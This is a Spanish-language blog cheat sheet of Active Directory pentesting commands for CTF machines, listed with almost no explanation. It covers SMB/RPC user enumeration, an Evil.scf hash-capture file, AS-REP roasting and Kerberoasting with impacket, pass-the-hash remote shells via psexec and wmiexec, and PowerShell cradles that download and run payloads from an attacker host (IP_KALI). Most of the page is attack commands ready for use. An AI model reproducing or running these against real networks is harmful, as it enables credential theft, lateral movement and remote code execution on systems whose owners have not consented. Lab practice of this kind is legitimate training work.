    1. Home
      2. /
    2. Active Directory - CTFs

    Active Directory - CTFs

    April 14, 2022  

    Esta sera una lista de comandos para el Pentesting en entornos de Directorio Activo.

    nmap

    nmap -sCV -p80 ... -oA nmap
xsltproc nmap.xml
php -S 0.0.0.0:80


xsltproc -o scan.html bootstrap-net.xsl nmap.xml
php -S 0.0.0.0:80

    Port 21 - ftp

    ftp IP_BOX #user:anonymous, password:ninguna
ftp> prompt off
ftp> mget *

    Port 25 - smtp

    #seclist->usershort.txt
perl -wnlE'print "$_\@domain"' usershort.txt > users.txt
smtp-user-enum -M RCPT -U users.txt -t IP_BOX

    Port 445 - smb

    smbclient -L IP_BOX -N
smbmap -H IP_BOX -u'guest'
rpcclient -U "" IP_BOX -N

    rpcclient -U "" IP_BOX -N -c"querydispinfo" | perl -M'Term::ANSIColor qw(:constants)' -wnlE'!/Desc:.+null/i and /(Account: .+).+(Name: .+).+(Desc: .+)/gi and print RED "\n$1", BLUE, "\n$2", GREEN, "\n$3"'

    rpcclient -U "" IP_target -N -c "enumdomusers" | perl -wnlE'print $1 if/\[(\w+)\]/gi' > users.txt

    mount -t cifs "//IP_BOX/Dir_share" /mnt/mountAD
tree -fas > users.txt
cat users.txt | perl -wnlE'print $1 if/Users\/(\w+)/gi' > users.txt
perl -M'Term::ANSIColor qw(:constants)' -wnlE'my $payload = `smbcacls \"//IP_BOX/Dir_shares\" /mnt/mountAD/Dir_share/Users/$_ -N`;print(BOLD BLUE "Usuario: $_", RED "\n$payload") if $payload=~/Everyone.*FULL/gi' users.txt


    impacket-smbserver share $(pwd) -smb2support
PS> copy data.zip \\IP_BOX\share\data.zip

    Evil.scf

    [Shell]
Command=2
IconFile=\\IP_KALI\share\xd.ico
[Taskbar]
Command=ToggleDesktop

    crackmapexec smb IP_BOX
crackmapexec smb IP_BOX -u'user' -p'P@$$w0rd!'
crackmapexec winrm IP_BOX -u'user' -p'P@$$w0rd!'

    rpcclient -U 'domain\user%P@$$w0rd!' IP_BOX -c'enumdomusers'
rpcclient -U 'domain\user%P@$$w0rd!' IP_BOX -c'queryuser <rid>'
-c'enumdomgroups'
-c'querygroupmem <rid>'

    evil-winrm -u'user' -p'P@$$w0rd!'

    rpcclient -U 'domain/user%P@$$w0rd!' IP_BOX -c"enumdomusers" | perl -wnE'say $1 if/\[(\w+)\]/gi' > users.txt
impacket-GetNPUsers domain/ -no-pass -usersfile users.txt
impacket-GetUserSPNs domain/user:'P@$$w0rd!' -request
-dc-ip 127.0.0.1

    impacket-psexec domain/user:'Passw0rd!'@IP_BOX cmd.exe
impacket-wmiexec domain/user@IP_BOX -hashes LMHASH:NTHASH

    Powershell

    IEX(New-Object Net.WebClient).DownloadString('http://IP_KALI/sponge.ps1')
wget http://IP_KALI/sponge.exe -OutFile sponge.exe
iwr -uri http://IP_KALI/sponge.exe -o sponge.exe
certutil -urlcache -f http://IP_KALI/sponge.exe sponge.exe
curl http://IP_KALI/sponge.exe -o sponge.exe
(New-Object System.Net.WebClient).DownloadFile('http://IP_KALI/sponge.exe','sponge.exe')

    $ExecutionContext.SessionState.LanguageMode

    Tags: AD

    Categories: AD, winAD

    Updated: April 14, 2022
